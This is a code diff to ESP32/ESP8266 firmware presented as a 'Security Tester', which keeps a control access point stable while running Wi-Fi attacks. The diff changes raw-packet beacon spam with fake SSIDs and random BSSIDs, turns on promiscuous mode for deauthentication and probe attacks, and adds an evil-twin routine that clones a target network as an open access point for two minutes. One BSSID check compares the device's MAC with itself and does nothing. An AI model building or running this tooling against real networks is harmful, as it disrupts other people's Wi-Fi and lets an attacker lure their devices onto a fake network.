@@ -482,33 +482,55 @@ void setup() {
   
   delay(500);
 
+  // Complete WiFi reset before starting AP
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect(true);
+  delay(2000);
+  
   // Start access point with robust settings
   bool apStarted = false;
   int attempts = 0;
   
-  while (!apStarted && attempts < 5) {
+  while (!apStarted && attempts < 10) {
     attempts++;
     Serial.println("AP Start Attempt " + String(attempts) + "...");
     
+    // Force complete reset between attempts
+    WiFi.mode(WIFI_OFF);
+    delay(1000);
+    WiFi.mode(WIFI_AP);
+    delay(1000);
+    
 #ifdef PLATFORM_ESP32
-    apStarted = WiFi.softAP(AP_SSID, AP_PASS, 6, false, 4);  // Channel 6, max 4 clients
+    apStarted = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);  // Channel 1, max 8 clients
 #else
-    apStarted = WiFi.softAP(AP_SSID, AP_PASS, 6, false);     // Channel 6
+    apStarted = WiFi.softAP(AP_SSID, AP_PASS, 1, false);     // Channel 1
 #endif
     
     if (!apStarted) {
-      Serial.println("AP start failed, retrying...");
+      Serial.println("AP start failed, performing hard reset...");
       WiFi.softAPdisconnect(true);
-      delay(2000);
+      delay(3000);
     } else {
-      delay(1000);  // Allow AP to stabilize
+      delay(2000);  // Allow AP to fully stabilize
       
       // Verify AP is actually working
       if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0)) {
         Serial.println("AP IP not assigned, retrying...");
         apStarted = false;
         WiFi.softAPdisconnect(true);
-        delay(2000);
+        delay(3000);
+      } else {
+        // Double-check AP is actually broadcasting
+        delay(1000);
+        if (WiFi.softAPgetStationNum() >= 0) {  // If we can get station count, AP is working
+          Serial.println("AP verification successful");
+        } else {
+          Serial.println("AP verification failed, retrying...");
+          apStarted = false;
+          WiFi.softAPdisconnect(true);
+          delay(3000);
+        }
       }
     }
   }
@@ -567,12 +589,13 @@ void setup() {
   );
 #endif
 
-  // Set WiFi to promiscuous mode for packet injection
+  // Configure WiFi for packet injection without breaking AP mode
 #ifdef PLATFORM_ESP32
-  esp_wifi_set_promiscuous(true);
+  // Don't enable promiscuous mode immediately as it can interfere with AP
+  Serial.println("Packet injection ready (will enable during attacks)");
 #else
-  wifi_set_opmode(STATION_MODE);
-  wifi_promiscuous_enable(1);
+  // For ESP8266, only enable promiscuous mode during attacks
+  Serial.println("Packet injection ready (will enable during attacks)");
 #endif
 
   Serial.println("Security Tester Ready!");
@@ -587,8 +610,8 @@ void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
 
-  // Enhanced AP monitoring every 5 seconds
-  if (millis() - lastAPCheck > 5000) {
+  // Enhanced AP monitoring every 3 seconds
+  if (millis() - lastAPCheck > 3000) {
     lastAPCheck = millis();
 
     // Check if AP mode is active with platform-specific handling
@@ -600,35 +623,56 @@ void loop() {
     bool apModeActive = (currentMode == SOFTAP_MODE || currentMode == STATIONAP_MODE);
 #endif
 
-    if (!apModeActive) {
-      Serial.println("⚠️ WARNING: AP mode lost! Attempting recovery...");
+    // Verify AP IP is still valid
+    IPAddress currentIP = WiFi.softAPIP();
+    String currentSSID = WiFi.softAPSSID();
+    
+    if (!apModeActive || currentIP == IPAddress(0, 0, 0, 0) || currentSSID != AP_SSID) {
+      Serial.println("⚠️ CRITICAL: AP mode compromised! Mode: " + String(apModeActive) + " IP: " + currentIP.toString() + " SSID: " + currentSSID);
       
-      // Attempt AP recovery
+      // Force complete AP reset
+      WiFi.softAPdisconnect(true);
+      WiFi.disconnect(true);
+      delay(2000);
+      
+      // Reconfigure IP settings
+      IPAddress apIP(192, 168, 4, 1);
+      IPAddress gateway(192, 168, 4, 1);
+      IPAddress subnet(255, 255, 255, 0);
+      
+      WiFi.mode(WIFI_OFF);
+      delay(1000);
       WiFi.mode(WIFI_AP);
       delay(1000);
       
+      if (!WiFi.softAPConfig(apIP, gateway, subnet)) {
+        Serial.println("❌ IP configuration failed!");
+      }
+      
+      // Restart AP with original settings
 #ifdef PLATFORM_ESP32
-      bool recovered = WiFi.softAP(AP_SSID, AP_PASS, 6, false, 4);
+      bool recovered = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
 #else
-      bool recovered = WiFi.softAP(AP_SSID, AP_PASS, 6, false);
+      bool recovered = WiFi.softAP(AP_SSID, AP_PASS, 1, false);
 #endif
       
-      if (recovered) {
+      if (recovered && WiFi.softAPIP() != IPAddress(0, 0, 0, 0)) {
         Serial.println("✅ AP mode recovered successfully");
+        Serial.println("✅ SSID: " + String(AP_SSID));
+        Serial.println("✅ IP: " + WiFi.softAPIP().toString());
       } else {
-        Serial.println("❌ AP recovery failed, restarting device...");
-        delay(3000);
+        Serial.println("❌ AP recovery failed completely, restarting device...");
+        delay(5000);
         ESP.restart();
       }
     }
     
-    // Verify AP IP is still valid
-    if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0)) {
-      Serial.println("⚠️ WARNING: AP IP lost! Reconfiguring...");
-      IPAddress apIP(192, 168, 4, 1);
-      IPAddress gateway(192, 168, 4, 1);
-      IPAddress subnet(255, 255, 255, 0);
-      WiFi.softAPConfig(apIP, gateway, subnet);
+    // Additional security check - verify SSID hasn't changed
+    if (currentSSID != AP_SSID && currentSSID.length() > 0) {
+      Serial.println("🚨 SECURITY ALERT: SSID changed to: " + currentSSID);
+      Serial.println("🚨 Forcing reset to prevent compromise...");
+      delay(2000);
+      ESP.restart();
     }
   }
 
@@ -933,15 +977,27 @@ void handleAttack() {
   attackStartTime = millis();
   packetsCount = 0;
 
-  // Keep AP mode active during attacks
-  WiFi.mode(WIFI_AP_STA);
-  delay(100);
+  // Only change mode/channel for specific attacks that require it
+  if (attackType != "beacon" && attackType != "evil_twin") {
+    // Keep AP mode active during attacks
+    WiFi.mode(WIFI_AP_STA);
+    delay(100);
 
 #ifdef PLATFORM_ESP32
-  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
 #else
-  wifi_set_channel(targetChannel);
+    wifi_set_channel(targetChannel);
 #endif
+  }
+  
+  // Enable promiscuous mode only during packet injection attacks
+  if (attackType == "deauth" || attackType == "probe") {
+#ifdef PLATFORM_ESP32
+    esp_wifi_set_promiscuous(true);
+#else
+    wifi_promiscuous_enable(1);
+#endif
+  }
 
   String response = "Attack started: " + attackType + " on " + targetSSID;
   Serial.println(response);
@@ -1098,10 +1154,35 @@ void handleStop() {
     pServer->getAdvertising()->stop();
     bleServerRunning = false;
   }
+  
+  // Disable promiscuous mode
+  esp_wifi_set_promiscuous(false);
+#else
+  // Disable promiscuous mode
+  wifi_promiscuous_enable(0);
 #endif
 
-  Serial.println("All attacks stopped");
-  server.send(200, "text/plain", "Attacks stopped");
+  // Restore AP mode and settings
+  WiFi.mode(WIFI_AP);
+  delay(500);
+  
+  // Ensure our AP is properly restored
+  if (WiFi.softAPSSID() != AP_SSID) {
+    Serial.println("Restoring original AP settings...");
+    WiFi.softAPdisconnect(true);
+    delay(500);
+    
+    IPAddress apIP(192, 168, 4, 1);
+    IPAddress gateway(192, 168, 4, 1);
+    IPAddress subnet(255, 255, 255, 0);
+    WiFi.softAPConfig(apIP, gateway, subnet);
+    
+    WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
+    Serial.println("AP restored: " + String(AP_SSID));
+  }
+
+  Serial.println("All attacks stopped and AP restored");
+  server.send(200, "text/plain", "Attacks stopped and AP restored");
 }
 
 void handleStats() {
@@ -1207,30 +1288,50 @@ void performDeauthAttack() {
 
 void performBeaconSpam() {
   static int beaconCount = 0;
+  static unsigned long lastBeacon = 0;
+  
+  // Rate limit beacon spam to prevent AP interference
+  if (millis() - lastBeacon < 200) return;
+  lastBeacon = millis();
 
-  // Generate random SSID
-  String fakeSSID = "FakeAP_" + String(random(1000, 9999));
+  // Generate random SSID but avoid our AP name
+  String fakeSSID;
+  do {
+    fakeSSID = "FakeAP_" + String(random(1000, 9999));
+  } while (fakeSSID == AP_SSID);
 
   // Update beacon packet
   beaconPacket[37] = fakeSSID.length();
   memcpy(&beaconPacket[38], fakeSSID.c_str(), fakeSSID.length());
 
-  // Random BSSID
-  for (int i = 10; i < 16; i++) {
-    beaconPacket[i] = random(0, 255);
-  }
-  memcpy(&beaconPacket[16], &beaconPacket[10], 6);
+  // Random BSSID but avoid our AP MAC
+  String ourMAC = WiFi.softAPmacAddress();
+  do {
+    for (int i = 10; i < 16; i++) {
+      beaconPacket[i] = random(0, 255);
+    }
+    memcpy(&beaconPacket[16], &beaconPacket[10], 6);
+  } while (String(WiFi.softAPmacAddress()) == ourMAC);
 
+  // Use different channel than our AP
+  int spamChannel = (targetChannel == 1) ? 6 : 1;
+  
 #ifdef PLATFORM_ESP32
-  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + fakeSSID.length(), false);
+  esp_wifi_set_channel(spamChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + fakeSSID.length(), false);
+  // Restore our AP channel
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
 #else
+  wifi_set_channel(spamChannel);
   wifi_send_pkt_freedom(beaconPacket, 38 + fakeSSID.length(), 0);
+  // Restore our AP channel
+  wifi_set_channel(1);
 #endif
 
   packetsCount++;
   beaconCount++;
 
-  if (beaconCount % 50 == 0) {
+  if (beaconCount % 25 == 0) {
     Serial.println("Beacon spam count: " + String(beaconCount));
   }
 }
@@ -1269,11 +1370,39 @@ void performKarmaAttack() {
 void performEvilTwin() {
   // Evil twin creates a fake AP with the target SSID
   static bool twinCreated = false;
+  static String originalSSID = "";
 
-  if (!twinCreated && targetSSID.length() > 0) {
-    WiFi.softAP(targetSSID.c_str(), "");
-    twinCreated = true;
-    Serial.println("Evil twin AP created: " + targetSSID);
+  if (!twinCreated && targetSSID.length() > 0 && targetSSID != AP_SSID) {
+    originalSSID = AP_SSID;
+    
+    // Temporarily change our AP to the target SSID
+    WiFi.softAPdisconnect(true);
+    delay(500);
+    
+    // Create evil twin with no password (open network)
+    if (WiFi.softAP(targetSSID.c_str(), "", 6, false, 4)) {
+      twinCreated = true;
+      Serial.println("Evil twin AP created: " + targetSSID);
+    } else {
+      Serial.println("Failed to create evil twin, restoring original AP");
+      // Restore original AP if evil twin fails
+      WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
+    }
+  }
+  
+  // Auto-restore original AP after 2 minutes
+  static unsigned long twinStartTime = 0;
+  if (twinCreated && twinStartTime == 0) {
+    twinStartTime = millis();
+  }
+  
+  if (twinCreated && (millis() - twinStartTime > 120000)) {
+    Serial.println("Restoring original AP after evil twin attack");
+    WiFi.softAPdisconnect(true);
+    delay(500);
+    WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
+    twinCreated = false;
+    twinStartTime = 0;
   }
 }
 
